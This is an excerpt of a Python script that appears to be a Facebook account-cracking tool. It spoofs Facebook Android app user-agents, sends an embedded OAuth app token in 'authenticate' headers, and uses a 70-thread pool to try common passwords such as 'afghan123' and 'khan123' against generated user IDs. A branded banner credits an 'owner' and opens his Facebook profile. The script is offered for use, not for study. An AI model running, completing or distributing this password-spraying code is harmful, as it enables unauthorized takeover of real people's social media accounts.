...
#----[pran links]-----
kkk = {'user-agent': 'Davik/2.1.0 (Linux; U; Android 7.0.0; galaxy s 23 ultra Build/galaxy s 10 plus [FBAN/FB4A;FBAV/241.0.0.41292;FBBV/975202462;FBDM/{density=1.5,width=483,height=805};FBLC/pl_PL;FBCR/AWCC;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.mlite;FBDV/galaxy A 10;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]', 'accept-encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'content-type': 'application/x-www-form-urlencoded', 'x-fb-sim-hni': '31061', 'x-fb-connection-type': 'unknown', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-net-hni': '28613', 'x-fb-connection-bandwidth': '29643048', 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-friendly-name': 'authenticate', 'x-fb-http-engine': 'Liger'}
...
try:
        ...
        print('\n Installing missing modules ...')
        os.system('pip install requests futures==2 > /dev/null')
        ua ="Mozilla/5.0 (Linux; Android 9; GT-P5200) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.136 Mobile Safari/537.36 FBAN/FB4A;FBAV/298.0.0.22.119;FBPN/com.facebook.katana;FBLC/en_US;FBBV/239175199;FBCR/SALAAM;FBMF/Samsung9;FBBD/samsung9;FBDV/SM-A530F9;FBSV/9;FBOP/5;FBCA/armeabi-v7a:armeabi:;]"
        ua ="Mozilla/5.0 (Linux; Android 9; GT-N7105T) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.136 Mobile Safari/537.36 FBAN/FB4A;FBAV/298.0.0.22.119;FBPN/com.facebook.katana;FBLC/en_US;FBBV/239175199;FBCR/mtn;FBMF/Samsung8;FBBD/samsung8;FBDV/SM-A530F8;FBSV/9;FBOP/5;FBCA/armeabi-v7a:armeabi:;]"
        ua ="Mozilla/5.0 (Linux; Android 9; GT-P1010) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.136 Mobile Safari/537.36 FBAN/FB4A;FBAV/298.0.0.22.119;FBPN/com.facebook.katana;FBLC/en_US;FBBV/239175199;FBCR/ROSHAN;FBMF/Samsung7;FBBD/samsung7;FBDV/SM-A530F7;FBSV/9;FBOP/5;FBCA/armeabi-v7a:armeabi:;]"
        ua= "Mozilla/5.0 (Linux; Android 9; SM-A530F) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.136 Mobile Safari/537.36 FBAN/FB4A;FBAV/298.0.0.22.119;FBPN/com.facebook.katana;FBLC/en_US;FBBV/239175199;FBCR/Three;FBMF/Samsung10;FBBD/samsung10;FBDV/SM-A530F10;FBSV/9;FBOP/5;FBCA/armeabi-v7a:armeabi:;]"      
...
=====================================================+
\033[1;32m|   𝑶𝑾𝑵𝑬𝑹        :   𝐏𝐀𝐊𝐓𝐈𝐘𝐀𝐖𝐀𝐋 𝐊𝐈𝐍𝐆
\033[1;32m|   𝑭𝑨𝑪𝑬𝑩𝑶𝑶𝑲     :   𝐊𝐈𝐍𝐆 𝐊𝐈𝐍𝐆
\033[1;32m|   𝑻𝑬𝑳𝑬𝑮𝑹𝑨𝑴     :  𝐇𝐀𝐉𝐈 𝐏𝐀𝐊𝐓𝐈𝐘𝐀𝐖𝐀𝐋
\033[1;32m|   𝑭𝑹𝑰𝑬𝑵𝑫       :   𝐏𝐀𝐊𝐓𝐈𝐘𝐀𝐖𝐀𝐋 𝐊𝐈𝐍𝐆
\033[1;32m|   𝑻𝑶𝑶𝑳𝑺        :     𝑭𝑹𝑬𝑬
\033[1;31m|   𝑽𝑬𝑹𝑺𝑰𝑶𝑵      :     1.1.9
\033[1;32m|+=====================================================+""")
os.system('xdg-open https://www.facebook.com/profile.php?id=100050824939857')
def linex():
        print('\033[1;32m----------------------------------------------')
...
def ZEAst():
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        for guru in user:
            uid = kode+guru
            pwx = [guru,'afghan123','afghan1234','afghan12345','100200','10002000','600700','20003000','500500','Afghanistan ','afghanistan','khan123']
